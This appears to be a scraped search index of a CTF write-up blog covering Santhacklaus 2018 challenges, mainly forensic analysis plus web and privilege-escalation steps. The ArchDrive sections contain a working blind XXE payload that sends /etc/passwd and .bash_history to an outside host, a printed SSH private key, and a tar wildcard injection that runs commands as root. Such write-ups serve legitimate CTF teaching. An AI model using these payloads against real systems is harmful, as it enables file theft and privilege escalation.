ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"State of the art According to the previous part, here is what we got: There is something to do with Veracrypt Veracrypt container hasn’t got magic number (documents and media could be containers) password.txt contains VC password (VC -\u003e Veracrypt) ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:3:2","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"Decrypting and mounting There are 3 keys: 7Rex-Mazda0-hover1-Quid Gourd-crown2-gao4-warp2 - Take On Me 0twain-Mao0-flash-6Goof-Gent documents -\u003e 0twain-Mao0-flash-6Goof-Gent media -\u003e 7Rex-Mazda0-hover1-Quid A little tip about forensic, when you’re mounting something: Make a copy of your volume, and work and that copy, it will prevent all unannounced change. $ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT loop0 7:0 0 10M 0 loop └─veracrypt1 254:4 0 9,8M 0 dm /mnt/veracrypt1 loop1 7:1 0 30M 0 loop └─veracrypt2 254:5 0 29,8M 0 dm /mnt/veracrypt2 $ sudo dd if=/dev/mapper/veracrypt1 of=clear_document.dmp bs=4M $ sudo dd if=/dev/mapper/veracrypt2 of=clear_media.dmp bs=4M After copying, I’m using testdisk to browse into. $ sudo testdisk /path/to/document.dmp Proceed -\u003e None -\u003e Advanced -\u003e Undelete Using testdisk allows me to find erased files. The MP3 in documents containers is not really helpful. ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:3:3","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"Hidden volume I remind me something, when I tried to learn how veracrypt work: hidden volume. https://www.veracrypt.fr/en/Hidden%20Volume.html There is one more key in the password.txt file: Gourd-crown2-gao4-warp2 - Take On Me And in the media container, there is a MP3 file called: -rwxr-xr-x 0 0 7080168 19-Dec-2018 10:28 a.ha_-_TakeOnMe.mp3 Let’s try to decrypt the media container with the given key and the MP3 as keyfiles: $ cp clear_media.dmp hidden_media.dmp WTF, it worked! You’re really crazy guys, first time seeing this in a CTF! :D $ sudo dd if=/dev/mapper/veracrypt3 of=clear_media_hidden.dmp bs=4M $ sudo testdisk clear_media_hidden.dmp ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:3:4","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"Flag In FLAG.TXT: IMTLD{I_h4v3_N0th1ng_T0_h1d3} ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:3:5","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"ArchDrive 4/3 Event Challenge Category Points Solves Santhacklaus ArchDrive 4/3 Web 700 8 ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:4:0","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"Statement ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:4:1","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"State of the art After recovering the erased zip archive in the hidden container, we obtain two files: README.md ticket.xml $ unzip Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip Archive: Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip inflating: ticket.xml inflating: README.md $ cat README.md ### This ticket is the property of `Dark Lottery` ### If you are not the buyer and if you found / stole this ticket, you must delete it immediately. This ticket is unique, do not share it. Remember to use it at your own risk. Thank you for your purchase ! --- scgz54b2lftqkkvn.onion --- $ cat ticket.xml \u003cticket\u003e \u003cnumber\u003e14453\u003c/number\u003e \u003cstatus\u003evalid\u003c/status\u003e \u003cdate\u003e20/12/2018\u003c/date\u003e \u003ctype\u003epremium\u003c/date\u003e \u003c/ticket\u003e ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:4:2","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"Tor browsing (BUYING DRUGS) What happens on this onion website: It’s impossible to buy ticket, it’s SOLD OUT :’( But if you got one, you can play: Ooooook, our ticket doesn’t work. Here is what we got: XML file Upload form Same output It looks to be a blind XXE, or XXE OOB (Out of band): https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/ ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:4:3","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"XXE OOB I will not use ngrok trick, because I got my VPS now. Before starting, ironforge is my VPS and miniverse is my laptop. I craft a new ticket: miniverse $ cat ticket.xml \u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?\u003e \u003c!DOCTYPE number [ \u003c!ENTITY % pe SYSTEM \"http://51.75.29.170:12345/bite.dtd\"\u003e %pe; %param1; ]\u003e \u003cticket\u003e \u003cnumber\u003e\u0026external;\u003c/number\u003e \u003cstatus\u003evalid\u003c/status\u003e \u003cdate\u003e20/12/2018\u003c/date\u003e \u003ctype\u003epremium\u003c/date\u003e \u003c/ticket\u003e The IP address is my VPS (where https://ctf.maki.bzh is hosted). This XML code, will grab the dtd file on my VPS, then: ironforge $ cat bite.dtd \u003c!ENTITY % stuff SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"\u003e \u003c!ENTITY % param1 \"\u003c!ENTITY external SYSTEM 'http://51.75.29.170:12346/a.php?data=%stuff;'\u003e\"\u003e The first XML will grab bite.dtd file, which send the content of /etc/passwd (base64 encoded) on the port 12346 of my VPS: It works! ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:4:4","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"File extraction In the /etc/passwd file, only one user got /bin/bash shell: root, what does it contain? ironforge $ cat bite.dtd \u003c!ENTITY % stuff SYSTEM \"php://filter/convert.base64-encode/resource=/root/.bash_history\"\u003e \u003c!ENTITY % param1 \"\u003c!ENTITY external SYSTEM 'http://51.75.29.170:12346/a.php?data=%stuff;'\u003e\"\u003e ironforge $ nc -lvp 12346 Listening on [0.0.0.0] (family 0, port 12346) Connection from 113.ip-51-75-202.eu 49966 received! GET /a.php?data=bHMgLWxhIC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAKY2F0IC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAK HTTP/1.0 Host: 51.75.29.170:12346 Connection: close ironforge $ echo -n 'bHMgLWxhIC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAKY2F0IC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAK' | base64 -d ls -la /home/dark_lottery/.ssh/id_rsa cat /home/dark_lottery/.ssh/id_rsa ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:4:5","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"SSH connection Ok, ssh keys, it start to smells good :D Following the same process, I extract: /home/dark_lottery/.ssh/id_rsa /etc/ssh/sshd_config /home/dark_lottery/.ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIICXQIBAAKBgQC3e6s3ZeRV/lgTltFgmVLB/LBYtzRBSpQUEt/1g/MsMidRhdBw W0kDlgchsVHL6kGt26JtHVr04MdFSeCUHiSJVuuqDiEPae+98l4LOWWg2dXwKsIv x6qDobCyGNi7HzmkxNTh+NxLq+aIsjk/gw38HtNkZAqwokySDcZhgwHFawIDAQAB AoGAQqB/vfAcCDYB2assgL1sVdDiYHS2Xvcr6lYoSUkO5n+X03yaAhLD4q96C3wO TdPU4cMdqi28t6tf8QMwr9h6P1+M7CDTsyBQbR7bvm88yzGNBuE9P3oBiKu24+x0 lPL1TORpHxGOersUz3eH2+hdnGs3xDYNSk8RoUY6ckCv3AECQQDbdwhuvDo+cnkN xupfdvSRTfXH05fosfvim6/yvw0ZeyxyAzXE5/KclpNCXzW70JrVI4huXjk5TD7l R019nJprAkEA1gcw48pAjFSc6oTexR1ayHQYGFGSx7PvXi+VJHAyFTXP4+l+pk72 qFlrT4tYMiZqbCws9qAthpsTBnauspBBAQJBAMWOwn2EXV3niEc5n7NuDrxalHxc YivrRFZ6VYnMJ8ufUKQVdaqaLZB+D3O451L5dteU0/SeRx7oHtogNIZ1mZ8CQAYp mNfGOAuSWB5MixmD2dxRs2vn1WEYpjjBB/tPm7GOphi63WGufl2kjXlx2q0+++t3 bif/vq/UgTy7aBZOHwECQQC4jty8EX0KdvylXIRzhCK7XvHze+GXHFptaB1wf+Wr LAKwqo3/gOiPe8w5CRUWuDfuy04a81OBEF3Gv2pyVctg -----END RSA PRIVATE KEY----- /etc/ssh/sshd_config ### SSH configuration file ### # General Port 2020 Protocol 2 AcceptEnv LANG LC_* [...] We got a port and a private key :D miniverse $ chmod 600 dark_lottery_priv.key miniverse $ ssh -i dark_lottery_priv.key dark_lottery@51.75.202.113 -p 2020 ___ _ __ _ _ / \\__ _ _ __| | __ / / ___ | |_| |_ ___ _ __ _ _ / /\\ / _` | '__| |/ / / / / _ \\| __| __/ _ \\ '__| | | | / /_// (_| | | | \u003c / /__| (_) | |_| || __/ | | |_| | /___,' \\__,_|_| |_|\\_\\ \\____/\\___/ \\__|\\__\\___|_| \\__, | |___/ Last login: Fri Dec 21 18:28:07 2018 from 77.206.71.218 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. dark_lottery@9db68003fdde:~$ ls flag.txt ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:4:6","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"Flag IMTLD{Wh4t_4_H4rD_ch4lL3nge} ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:4:7","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"ArchDrive 5/3 Event Challenge Category Points Solves Santhacklaus ArchDrive 5/3 App-script 300 8 ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:5:0","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"Statement ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:5:1","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"State of the art Let’s privesc. As I said in NetRunner 3/3, there are few ways to privesc: sudo misconfigured crontab or services running as privileged user suid binary or script to exploit $ sudo -l -bash: sudo: command not found $ ps aux| grep root root 1 0.0 0.0 19708 3200 ? Ss Dec21 0:00 /bin/bash ./start.sh root 8 0.0 0.0 69952 5756 ? S Dec21 0:00 /usr/sbin/sshd -D root 9 0.0 0.0 29740 2808 ? S Dec21 0:00 cron -f root 97 0.0 0.0 19952 3656 pts/2 Ss+ Dec21 0:00 bash root 13454 0.0 0.0 69952 6504 ? Ss 12:20 0:00 sshd: dark_lottery [priv] dark_lo+ 13539 0.0 0.0 11112 988 pts/0 S+ 12:26 0:00 grep root Crontab as root, nice, let’s find the cron script: $ ls -la / total 84 drwxr-xr-x 1 root root 4096 Dec 21 18:26 . drwxr-xr-x 1 root root 4096 Dec 21 18:26 .. -rwxr-xr-x 1 root root 0 Dec 21 18:26 .dockerenv -rwxrwxr-- 1 root root 147 Dec 20 18:24 backup.sh dr--r----- 1 root root 4096 Dec 22 12:27 backups drwxr-xr-x 1 root root 4096 Dec 20 18:26 bin drwxr-xr-x 2 root root 4096 Oct 20 10:40 boot [...] The backup.sh file is not a regular linux file :p $ cat /backup.sh #!/bin/sh /bin/rm -rf /backups/* cd /opt/src/ \u0026\u0026 /bin/tar -cvzf /backups/bck-src_`/bin/date +\"%Y-%m-%d_%H%M\"`.tar.gz * /bin/chmod 440 -R /backups Ok, the exploit is tar wildcard: https://thanat0s.trollprod.org/2014/07/et-hop-ca-root/ ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:5:2","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"Exploit First, where is the flag: $ ls -la /opt/src total 12 drwxrwxrwx 1 root root 4096 Dec 21 19:03 . drwxr-xr-x 1 root root 4096 Dec 20 18:27 .. -r--r----- 1 root root 26 Dec 20 18:24 .flag.txt Second, exploit time :D $ touch -- '--checkpoint-action=exec=sh install_suidbackdoor.sh' '--checkpoint=1' $ echo 'cp /opt/src/.flag.txt /tmp/flag_maki' \u003e install_suidbackdoor.sh $ echo 'chmod 777 /tmp/flag_maki' \u003e\u003e install_suidbackdoor.sh After a minute: $ ls -la /tmp/flag_maki -rwxrwxrwx 1 root root 26 Dec 22 12:32 /tmp/flag_maki ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:5:3","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"Flag IMTLD{R04d_T0_Th3_sW1tCH} ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhachlaus2018archdrive/:5:4","tags":["santhacklaus","pinkflood","pentest","web","lfi","sudo","tar","xxe"],"title":"[Santhacklaus 2018] - ArchDrive","uri":"maki.bzh/writeups/santhachlaus2018archdrive/"},{"categories":["Writeups"],"content":"Statement ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018bretstiles/:1:0","tags":["santhacklaus","pinkflood","forensic","memory","gimp"],"title":"[Santhacklaus 2018] - Bret Stiles","uri":"maki.bzh/writeups/santhacklaus2018bretstiles/"},{"categories":["Writeups"],"content":"State of the art A memory dump \u003c3 $ volatility -f challenge.dmp imageinfo [Some garbage errors] Suggested Profile(s) : Win10x64_17134, Win10x64_10240_17770, Win10x64_14393, Win10x64_10586, Win10x64, Win2016x64_14393, Win10x64_16299, Win10x64_15063 (Instantiated with Win10x64_15063) AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS) AS Layer2 : WindowsCrashDumpSpace64 (Unnamed AS) AS Layer3 : FileAddressSpace (/home/monique/Téléchargements/bretstiles/challenge.dmp) PAE type : No PAE DTB : 0x1aa000L KDBG : 0xf80150ad4a60L Number of Processors : 1 Image Type (Service Pack) : 0 KPCR for CPU 0 : 0xfffff80150b2d000L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2018-11-05 20:50:14 UTC+0000 Image local date and time : 2018-11-05 12:50:14 -0800 Yay Windows 10… :'( ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018bretstiles/:2:0","tags":["santhacklaus","pinkflood","forensic","memory","gimp"],"title":"[Santhacklaus 2018] - Bret Stiles","uri":"maki.bzh/writeups/santhacklaus2018bretstiles/"},{"categories":["Writeups"],"content":"Find the right profile First things to do is finding the correct Windows 10 profile for volatility. After some test, I finally find: Win10x64_10586 $ volatility -f challenge.dmp --profile=Win10x64_10586 pstree Name Pid PPid Thds Hnds Time -------------------------------------------------- ------ ------ ------ ------ ---- 0xffffe0009342b680:System 4 0 103 0 2018-11-05 20:47:01 UTC+0000 . 0xffffe00094897040:smss.exe 272 4 3 0 2018-11-05 20:47:01 UTC+0000 .. 0xffffe000952c6080:smss.exe 412 272 0 ------ 2018-11-05 20:47:08 UTC+0000 ... 0xffffe000951e8540:csrss.exe 432 412 10 0 2018-11-05 20:47:08 UTC+0000 ... 0xffffe00095395080:winlogon.exe 484 412 5 0 2018-11-05 20:47:08 UTC+0000 .... 0xffffe0009566d640:dwm.exe 772 484 12 0 2018-11-05 20:47:09 UTC+0000 .... 0xffffe00095ddc680:userinit.exe 2332 484 0 ------ 2018-11-05 20:47:33 UTC+0000 ..... 0xffffe00095dda500:explorer.exe 2348 2332 58 0 2018-11-05 20:47:33 UTC+0000 ...... 0xffffe00096164080:OneDrive.exe 3328 2348 18 0 2018-11-05 20:47:53 UTC+0000 ...... 0xffffe000961ae3c0:mspaint.exe 3372 2348 7 0 2018-11-05 20:47:56 UTC+0000 ...... 0xffffe000961257c0:VBoxTray.exe 3252 2348 13 0 2018-11-05 20:47:52 UTC+0000 ...... 0xffffe0009474f080:cmd.exe 2144 2348 5 0 2018-11-05 20:50:05 UTC+0000 ....... 0xffffe00094841080:conhost.exe 3352 2144 3 0 2018-11-05 20:50:05 UTC+0000 0xffffe00095df8080:NisSrv.exe 2112 524 7 0 2018-11-05 20:47:30 UTC+0000 [...] It looks to work, let’s continue the analysis. ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018bretstiles/:3:0","tags":["santhacklaus","pinkflood","forensic","memory","gimp"],"title":"[Santhacklaus 2018] - Bret Stiles","uri":"maki.bzh/writeups/santhacklaus2018bretstiles/"},{"categories":["Writeups"],"content":"File list In a forensic challenge, I immediately list all opened file in memory, using filescan plugin: $ volatility -f challenge.dmp --profile=Win10x64_10586 filescan \u003e filescan.txt $ cat filescan.txt| grep John | grep Desktop 0x0000e000948df780 32768 1 R--rwd \\Device\\HarddiskVolume2\\Users\\John\\Desktop 0x0000e000956917a0 2 0 R--rwd \\Device\\HarddiskVolume2\\Users\\John\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System Tools\\Desktop.ini 0x0000e00095e65320 32768 1 R--rwd \\Device\\HarddiskVolume2\\Users\\John\\Desktop 0x0000e00095f03090 16 0 R--rwd \\Device\\HarddiskVolume2\\Users\\John\\Desktop\\desktop.ini 0x0000e0009600df20 2 0 R--rwd \\Device\\HarddiskVolume2\\Users\\John\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Desktop.ini 0x0000e00096087a20 2 0 R--rwd \\Device\\HarddiskVolume2\\Users\\John\\AppData\\Roaming\\Microsoft\\Windows\\SendTo\\Desktop.ini 0x0000e0009608abe0 8 0 R--r-d \\Device\\HarddiskVolume2\\Users\\John\\Desktop\\bob.png 0x0000e000960c0700 32768 1 R--rw- \\Device\\HarddiskVolume2\\Users\\John\\Desktop We can notice “bob.png” on the Desktop, let’s extract it: $ volatility -f challenge.dmp --profile=Win10x64_10586 dumpfiles -Q 0x0000e000960c0700 -D . Aaaaaaaaaand… Nothing. Ok, not a problem, I got more than one trick in my hat :D ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018bretstiles/:4:0","tags":["santhacklaus","pinkflood","forensic","memory","gimp"],"title":"[Santhacklaus 2018] - Bret Stiles","uri":"maki.bzh/writeups/santhacklaus2018bretstiles/"},{"categories":["Writeups"],"content":"Process memory dump in GIMP During my search for a correct profile, I noticed the mspaint.exe process. According to this website: https://w00tsec.blogspot.com/2015/02/extracting-raw-pictures-from-memory.html I tried to dump the process memory and open it in GIMP as raw picture. $ volatility -f challenge.dmp --profile=Win10x64_10586 memdump -p 3372 -D . ************************************************************************ Writing mspaint.exe [ 3372] to 3372.dmp $ mv 3372.dmp mspaint.data After few minutes burning my eyes, I finally found the Graal: ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018bretstiles/:5:0","tags":["santhacklaus","pinkflood","forensic","memory","gimp"],"title":"[Santhacklaus 2018] - Bret Stiles","uri":"maki.bzh/writeups/santhacklaus2018bretstiles/"},{"categories":["Writeups"],"content":"Flag IMTLD{1m4gin4ti0N} ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018bretstiles/:6:0","tags":["santhacklaus","pinkflood","forensic","memory","gimp"],"title":"[Santhacklaus 2018] - Bret Stiles","uri":"maki.bzh/writeups/santhacklaus2018bretstiles/"},{"categories":["Writeups"],"content":"Fun fact You can use strings and grep, best friends of forensic analysts: ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018bretstiles/:7:0","tags":["santhacklaus","pinkflood","forensic","memory","gimp"],"title":"[Santhacklaus 2018] - Bret Stiles","uri":"maki.bzh/writeups/santhacklaus2018bretstiles/"},{"categories":["Writeups"],"content":"Mission impossible 1 ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018missionimpossible/:1:0","tags":["santhacklaus","pinkflood","volatility","linux","profile","zip","det"],"title":"[Santhacklaus 2018] - Mission impossible","uri":"maki.bzh/writeups/santhacklaus2018missionimpossible/"},{"categories":["Writeups"],"content":"Statement (Awesome work for the video, really appreciate it as a player) ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018missionimpossible/:1:1","tags":["santhacklaus","pinkflood","volatility","linux","profile","zip","det"],"title":"[Santhacklaus 2018] - Mission impossible","uri":"maki.bzh/writeups/santhacklaus2018missionimpossible/"},{"categories":["Writeups"],"content":"State of the art A memory dump again :D $ volatility -f challenge.elf imageinfo [...] Take a looooooooong time [...] $ strings challenge.elf | grep 'Linux version' | sort | uniq 2018-12-16T11:14:09.150996-05:00 virtual-debian kernel: [ 0.000000] Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14) Dec 16 11:14:09 virtual-debian kernel: [ 0.000000] Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14) Dec 16 11:14:09 virtual-debian kernel: [10295.865806] intel_idle: does noual-debian kernel: [ 0.000000] Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14) Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14) Linux version %d.%d.%d MESSAGE=Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14) Ok, it’s a linux memory dump… ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018missionimpossible/:1:2","tags":["santhacklaus","pinkflood","volatility","linux","profile","zip","det"],"title":"[Santhacklaus 2018] - Mission impossible","uri":"maki.bzh/writeups/santhacklaus2018missionimpossible/"},{"categories":["Writeups"],"content":"Profile generation To do a linux profile for volatility, we need: Linux distribution Version of the distribution Version of the kernel By greping on Linux version we got those informations: Debian Debian 8 (the deb8u1) 3.16.0-6-amd64 kernel I choose to download the latest release of Debian 8: https://cdimage.debian.org/cdimage/archive/8.11.0/amd64/iso-cd/debian-8.11.0-amd64-netinst.iso Pro tip: Download the netinstall version of Linux, during installation, don’t select any additional package except SSH. When the Debian 8 VM is up, just ssh it and check the installed kernel: $ ssh user@192.168.122.197 debianVM $ uname -a Linux debian 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux It looks to be the right kernel, good. No need to install a new one. Now, install package for linux profile generation and generate it: debianVM $ sudo apt-get install -y build-essential volatility-tools dwarfdump linux-headers-3.16.0-6-amd64 debianVM $ cd /usr/src/volatility-tools/linux/ debianVM $ su root debianVM # make debianVM # zip MI1_profile.zip /usr/src/volatility-tools/linux/module.dwarf /boot/System.map-3.16.0-6-amd64 updating: usr/src/volatility-tools/linux/module.dwarf (deflated 91%) updating: boot/System.map-3.16.0-6-amd64 (deflated 79%) Our profile is created, we have to put in the right place for volatility: $ sudo updatedb # I know it's deprectated :') $ locate volatility | grep overlays | grep linux /usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux /usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/__init__.py /usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/__init__.pyc /usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/elf.py /usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/elf.pyc /usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/linux.py /usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux/linux.pyc Place the MI1_profile.zip archive in /usr/local/lib/python2.7/dist-packages/volatility-2.6-py2.7.egg/volatility/plugins/overlays/linux folder. $ volatility --info | grep MI1 LinuxMI1_profilex64 - A Profile for Linux MI1_profile x64 Let’s try if it work, to do this, just use a linux volatility plugin, such as linux_banner: $ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_banner Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14) It works! MI1_profile.zip: https://mega.nz/#!mSRCCQ6L!HRz6qJ02pwlg89Gcc1OQ-iIgBzaAWW6EKIThFXLg3Mc ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018missionimpossible/:1:3","tags":["santhacklaus","pinkflood","volatility","linux","profile","zip","det"],"title":"[Santhacklaus 2018] - Mission impossible","uri":"maki.bzh/writeups/santhacklaus2018missionimpossible/"},{"categories":["Writeups"],"content":"Raiders of the Lost Zip What did the user on the system? $ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_bash Pid Name Command Time Command -------- -------------------- ------------------------------ ------- 1867 bash 2018-12-16 16:17:45 UTC+0000 rm flag.txt 1867 bash 2018-12-16 16:17:45 UTC+0000 ls 1867 bash 2018-12-16 16:17:45 UTC+0000 ls 1867 bash 2018-12-16 16:17:45 UTC+0000 sudo reboot 1867 bash 2018-12-16 16:17:45 UTC+0000 zip -r -e -s 64K backup.zip * 1867 bash 2018-12-16 16:17:45 UTC+0000 cat /dev/urandom \u003e flag.txt 1867 bash 2018-12-16 16:17:45 UTC+0000 cd /var/www/a-strong-hero.com/ 1867 bash 2018-12-16 16:17:45 UTC+0000 sudo reboot 1867 bash 2018-12-16 16:17:49 UTC+0000 cd /var/www/a-strong-hero.com/ 1867 bash 2018-12-16 16:17:49 UTC+0000 ls 1867 bash 2018-12-16 16:18:09 UTC+0000 find . -type f -print0 | xargs -0 md5sum \u003e md5sums.txt 1867 bash 2018-12-16 16:18:10 UTC+0000 cat md5sums.txt Hmmm… What an ugly zip command. After reading the zip manual, actually this command will encrypt recursively and split the original archive into 64Ko pieces. In order to find all parts, let’s list all file opened in memory: $ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_find_file -L \u003e filelist $ cat filelist | grep backup 261933 0xffff88001e61e4b0 /var/www/a-strong-hero.com/backup.z02 263120 0xffff88001e61e898 /var/www/a-strong-hero.com/backup.z05 263122 0xffff88001e61ec80 /var/www/a-strong-hero.com/backup.z07 263123 0xffff88001e61d0c8 /var/www/a-strong-hero.com/backup.z08 263125 0xffff88001e61d4b0 /var/www/a-strong-hero.com/backup.zip 261792 0xffff88001e61d898 /var/www/a-strong-hero.com/backup.z01 262990 0xffff88001e61dc80 /var/www/a-strong-hero.com/backup.z04 263121 0xffff88001e61c0c8 /var/www/a-strong-hero.com/backup.z06 263124 0xffff88001e61c4b0 /var/www/a-strong-hero.com/backup.z09 262949 0xffff88001e61cc80 /var/www/a-strong-hero.com/backup.z03 I think I found all pieces! Let’s extract them and recreate the original archive: $ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_find_file -i 0xffff88001e61d898 -O backup.z01 [...] Reproduce the operation with correct offset until the z09 [...] $ zip -s 0 backup.zip --out unsplit.zip $ unzip -l unsplit.zip Archive: 